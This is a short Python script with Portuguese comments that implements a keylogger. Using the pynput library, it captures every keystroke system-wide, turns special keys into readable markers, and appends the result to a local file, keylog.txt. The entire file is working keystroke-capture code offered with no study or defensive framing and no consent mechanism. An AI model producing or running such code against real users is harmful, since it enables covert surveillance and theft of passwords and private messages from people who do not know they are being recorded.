from pynput import keyboard


# Define as teclas a serem ignoradas
ignore_keys = {
    keyboard.Key.shift_l, 
    keyboard.Key.shift_r,
    keyboard.Key.shift_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.tab,
    keyboard.Key.cmd
}

# Função chamada a cada vez que uma tecla é pressionada
def on_press(key):
    try:
        # Se for uma tecla normal ('a', 'b', '1', etc.')
        with open("keylog.txt", "a", encoding='utf-8') as f:
            f.write(key.char)
    except AttributeError:
        # Se for uma tecla especial (Key.space, Key.enter, etc.)
        with open("keylog.txt", "a", encoding='utf-8') as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.backspace:
                f.write('[BACKSPACE]')
            elif key == keyboard.Key.delete:
                f.write('[DELETE]')
            elif key == keyboard.Key.tab:
                f.write('\t')
            elif key == keyboard.Key.esc:
                f.write('[ESC]')
            elif key in ignore_keys:
                pass
            else:
                f.write(f'[{key}]')

# Inicia o listener de teclado
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
